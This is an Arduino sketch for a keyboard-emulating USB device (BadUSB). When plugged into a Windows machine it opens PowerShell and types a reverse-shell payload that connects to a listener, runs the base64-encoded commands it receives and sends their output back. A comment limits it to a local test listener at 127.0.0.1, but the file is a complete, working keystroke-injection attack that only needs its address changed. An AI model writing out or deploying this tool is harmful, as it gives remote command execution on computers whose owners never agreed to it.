#include <Keyboard.h>

// This client connects only to the test listener on the attached computer.
const char payload[] PROGMEM =
  "$c=New-Object Net.Sockets.TcpClient('127.0.0.1',4444);"
  "$s=$c.GetStream();$r=New-Object IO.StreamReader($s);"
  "$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;"
  "$w.WriteLine('LEONARDO_LOCAL_V1');"
  "while($q=$r.ReadLine()){if($q -eq 'exit'){break};"
  "try{$o=& ([scriptblock]::Create([Text.Encoding]::UTF8.GetString("
  "[Convert]::FromBase64String($q)))) 2>&1 | Out-String}"
  "catch{$o=$_|Out-String};"
  "$w.WriteLine([Convert]::ToBase64String("
  "[Text.Encoding]::UTF8.GetBytes([string]$o)))};$c.Close();exit";

void setup() {
  Keyboard.begin(KeyboardLayout_fr_FR);
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(150);
  Keyboard.releaseAll();
  delay(600);
  Keyboard.println("powershell -NoProfile");
  delay(2500);
  for (unsigned int i = 0; i < sizeof(payload) - 1; ++i) {
    Keyboard.write(pgm_read_byte_near(payload + i));
    delay(0);
  }
  Keyboard.write(KEY_RETURN);
  Keyboard.end();
}

void loop() {}
